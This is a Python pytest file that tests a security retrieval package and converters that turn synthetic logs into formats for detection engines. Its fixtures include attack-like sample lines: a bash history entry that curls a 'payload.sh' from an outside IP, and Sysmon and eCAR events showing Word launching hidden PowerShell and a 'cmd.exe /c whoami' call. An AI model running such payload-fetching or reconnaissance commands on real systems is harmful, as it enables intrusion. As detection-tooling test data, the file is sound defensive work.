"""Baseline integration tests for existing packages (packages/apt-rag & script/log_convert)."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import orjson
import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
APT_RAG_DIR = REPO_ROOT / "packages" / "apt-rag"
LOG_CONVERT_DIR = REPO_ROOT / "script" / "log_convert"


# ---------------------------------------------------------------------------
# packages/apt-rag & LangGraph v1 search_knowledge
# ---------------------------------------------------------------------------


def test_apt_rag_imports_and_cli_version() -> None:
    import apt_rag
    import rag

    assert hasattr(apt_rag, "RagClient")
    assert hasattr(rag, "config")

    proc = subprocess.run(
        [sys.executable, "-m", "apt_rag", "--version"],
        capture_output=True,
        text=True,
        check=True,
        timeout=15,
    )
    assert "apt-rag" in proc.stdout


def test_apt_rag_search_public_api_and_cli(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.syspath_prepend(str(APT_RAG_DIR))
    import search_public

    results = search_public.search("Sysmon process creation", top_k=3)
    assert len(results) == 3
    for item in results:
        assert item["chunk_id"]
        assert item["document_id"]
        assert item["text"]

    proc = subprocess.run(
        [
            sys.executable,
            str(APT_RAG_DIR / "search_public.py"),
            "Sysmon process creation",
            "--top-k",
            "2",
            "--json",
        ],
        capture_output=True,
        text=True,
        check=True,
        timeout=30,
    )
    payload = json.loads(proc.stdout)
    assert len(payload["results"]) == 2


def test_langgraph_rag_smoke_and_public_kb_adapter(monkeypatch: pytest.MonkeyPatch) -> None:
    smoke_py = APT_RAG_DIR / "tools" / "langgraph_rag" / "smoke.py"
    proc = subprocess.run(
        [sys.executable, "-B", str(smoke_py)],
        capture_output=True,
        text=True,
        check=True,
        timeout=60,
    )
    assert "OK" in proc.stderr or "OK" in proc.stdout

    langgraph_rag_dir = APT_RAG_DIR / "tools" / "langgraph_rag"
    monkeypatch.syspath_prepend(str(langgraph_rag_dir))
    from langgraph_adapter import build_tool

    tool = build_tool(
        langgraph_rag_dir / "tool.json",
        case_id="case-m1",
        run_id="run-m1",
        resources={"knowledge": APT_RAG_DIR / "public_kb" / "chunks.jsonl.gz"},
    )
    raw_reply = tool.invoke({"query": "Sysmon process creation", "top_k": 2, "mode": "bm25"})
    reply = json.loads(raw_reply)
    assert reply["ok"] is True
    assert reply["evidence_ids"] == []
    assert len(reply["data"]["refs"]) >= 1


# ---------------------------------------------------------------------------
# script/log_convert (6 formats x 4 engine formatters, CLI + in-process lib.*)
# ---------------------------------------------------------------------------


def _write_synthetic_logs(base: Path) -> dict[str, Path]:
    base.mkdir(parents=True, exist_ok=True)
    winxml = base / "windows_event_sysmon.xml"
    winxml.write_text(
        """<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-05-30T10:00:01.1234567Z"/>
      <EventRecordID>101</EventRecordID>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WKS-01.example.local</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="ProcessId">4242</Data>
      <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -nop -w hidden</Data>
      <Data Name="ParentImage">C:\\Program Files\\Microsoft Office\\WINWORD.EXE</Data>
    </EventData>
  </Event>
</Events>
""",
        encoding="utf-8",
    )

    zeek = base / "conn.json"
    zeek.write_text(
        json.dumps(
            {
                "ts": 1717063202.5,
                "uid": "C12345",
                "id.orig_h": "10.0.1.8",
                "id.orig_p": 51030,
                "id.resp_h": "203.0.113.8",
                "id.resp_p": 443,
                "proto": "tcp",
                "conn_state": "SF",
            }
        )
        + "\n",
        encoding="utf-8",
    )

    ecar = base / "ecar.json"
    ecar.write_text(
        json.dumps(
            {
                "id": "ecar-001",
                "object": "PROCESS",
                "action": "CREATE",
                "hostname": "WKS-01",
                "principal": "DOMAIN\\alice",
                "pid": 4242,
                "ppid": 1100,
                "timestamp_ms": 1717063203000,
                "properties": {
                    "image_path": "C:\\Windows\\System32\\cmd.exe",
                    "command_line": "cmd.exe /c whoami",
                },
            }
        )
        + "\n",
        encoding="utf-8",
    )

    syslog = base / "syslog.log"
    syslog.write_text(
        "<34>1 2024-05-30T10:00:04Z APP-LNX-02 sshd 2211 ID42 - Accepted publickey for alice\n",
        encoding="utf-8",
    )

    web_access = base / "web_access.log"
    web_access.write_text(
        '198.51.100.10 - - [30/May/2024:10:00:05 +0000] "GET /login?user=admin HTTP/1.1" 200 512 "-" "curl/8.5"\n',
        encoding="utf-8",
    )

    bash_history = base / "alice.bash_history"
    bash_history.write_text("#1717063206\ncurl -s http://203.0.113.8/payload.sh\n", encoding="utf-8")

    return {
        "winxml": winxml,
        "zeek_json": zeek,
        "ecar_json": ecar,
        "syslog": syslog,
        "web_access": web_access,
        "bash_history": bash_history,
    }


@pytest.mark.parametrize(
    ("fmt_key", "script_name", "output_kind"),
    [
        ("winxml", "zircolite_winxml_jsonl.py", "jsonl"),
        ("winxml", "hayabusa_winxml_jsonl.py", "jsonl_index"),
        ("winxml", "rsigma_winxml_ndjson.py", "jsonl"),
        ("winxml", "chainsaw_winxml_json.py", "json_array"),
        ("zeek_json", "zircolite_zeek_json_jsonl.py", "jsonl"),
        ("zeek_json", "rsigma_zeek_json_ndjson.py", "jsonl"),
        ("zeek_json", "chainsaw_zeek_json_json.py", "json_array"),
        ("ecar_json", "zircolite_ecar_json_jsonl.py", "jsonl"),
        ("ecar_json", "rsigma_ecar_json_ndjson.py", "jsonl"),
        ("ecar_json", "chainsaw_ecar_json_json.py", "json_array"),
        ("syslog", "zircolite_syslog_jsonl.py", "jsonl"),
        ("syslog", "rsigma_syslog_ndjson.py", "jsonl"),
        ("syslog", "chainsaw_syslog_json.py", "json_array"),
        ("web_access", "zircolite_web_access_jsonl.py", "jsonl"),
        ("web_access", "rsigma_web_access_ndjson.py", "jsonl"),
        ("web_access", "chainsaw_web_access_json.py", "json_array"),
        ("bash_history", "zircolite_bash_history_jsonl.py", "jsonl"),
        ("bash_history", "rsigma_bash_history_ndjson.py", "jsonl"),
        ("bash_history", "chainsaw_bash_history_json.py", "json_array"),
    ],
)
def test_log_convert_cli_all_formats_and_targets(
    tmp_path: Path,
    fmt_key: str,
    script_name: str,
    output_kind: str,
) -> None:
    inputs = _write_synthetic_logs(tmp_path / "inputs")
    out_file = tmp_path / "out" / f"{script_name}.out"
    cmd = [
        sys.executable,
        str(LOG_CONVERT_DIR / script_name),
        "-i",
        str(inputs[fmt_key]),
        "-o",
        str(out_file),
        "--case-id",
        "case-m1",
    ]
    index_file = tmp_path / "out" / "hayabusa_index.jsonl"
    if output_kind == "jsonl_index":
        cmd.extend(["--index-out", str(index_file)])

    subprocess.run(cmd, check=True, capture_output=True, text=True, timeout=30)
    assert out_file.is_file()

    if output_kind == "json_array":
        records = orjson.loads(out_file.read_bytes())
        assert isinstance(records, list)
    else:
        lines = [line for line in out_file.read_bytes().splitlines() if line.strip()]
        records = [orjson.loads(line) for line in lines]

    assert len(records) == 1
    rec = records[0]
    assert str(rec["event_id"]).startswith("evt_")
    assert str(rec["raw_id"]).startswith("raw_")

    if script_name == "chainsaw_winxml_json.py":
        assert rec["Event"]["System"]["TimeCreated"].endswith("Z")
    else:
        assert str(rec["@timestamp"]).endswith("Z")

    if output_kind == "jsonl_index":
        idx_lines = [line for line in index_file.read_bytes().splitlines() if line.strip()]
        assert len(idx_lines) == 1
        idx_rec = orjson.loads(idx_lines[0])
        assert idx_rec["event_id"] == rec["event_id"]
        assert idx_rec["RecordID"] == 101


def test_log_convert_in_process_lib_imports(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.syspath_prepend(str(LOG_CONVERT_DIR))
    from lib import common, formatters, parsers

    inputs = _write_synthetic_logs(tmp_path / "inproc")

    win_parsed = list(parsers.parse_winxml_file(inputs["winxml"], case_id="case-inproc"))
    assert len(win_parsed) == 1
    assert win_parsed[0]["utc_timestamp"].endswith("Z")
    z_win = formatters.format_zircolite_winxml(win_parsed[0])
    h_win, h_idx = formatters.format_hayabusa_winxml(win_parsed[0])
    r_win = formatters.format_rsigma_winxml(win_parsed[0])
    c_win = formatters.format_chainsaw_winxml(win_parsed[0])
    assert z_win["event_id"] == h_idx["event_id"] == r_win["event_id"] == c_win["event_id"]
    assert h_win["RecordNumber"] == 101

    zeek_parsed = list(parsers.parse_zeek_json_file(inputs["zeek_json"], case_id="case-inproc"))
    ecar_parsed = list(parsers.parse_ecar_json_file(inputs["ecar_json"], case_id="case-inproc"))
    sys_parsed = list(parsers.parse_syslog_file(inputs["syslog"], case_id="case-inproc"))
    web_parsed = list(parsers.parse_web_access_file(inputs["web_access"], case_id="case-inproc"))
    bash_parsed = list(
        parsers.parse_bash_history_file(inputs["bash_history"], case_id="case-inproc")
    )

    formatted = [
        formatters.format_rsigma_zeek(zeek_parsed[0]),
        formatters.format_rsigma_ecar(ecar_parsed[0]),
        formatters.format_rsigma_syslog(sys_parsed[0]),
        formatters.format_rsigma_web_access(web_parsed[0]),
        formatters.format_rsigma_bash_history(bash_parsed[0]),
        formatters.format_chainsaw_zeek(zeek_parsed[0]),
        formatters.format_chainsaw_ecar(ecar_parsed[0]),
        formatters.format_chainsaw_syslog(sys_parsed[0]),
        formatters.format_chainsaw_web_access(web_parsed[0]),
        formatters.format_chainsaw_bash_history(bash_parsed[0]),
        formatters.format_zircolite_zeek(zeek_parsed[0]),
        formatters.format_zircolite_ecar(ecar_parsed[0]),
        formatters.format_zircolite_syslog(sys_parsed[0]),
        formatters.format_zircolite_web_access(web_parsed[0]),
        formatters.format_zircolite_bash_history(bash_parsed[0]),
    ]
    for item in formatted:
        assert str(item["event_id"]).startswith("evt_")
        assert str(item["@timestamp"]).endswith("Z")

    assert common.make_event_id(common.make_raw_id("c", "f", 1), 0).startswith("evt_")
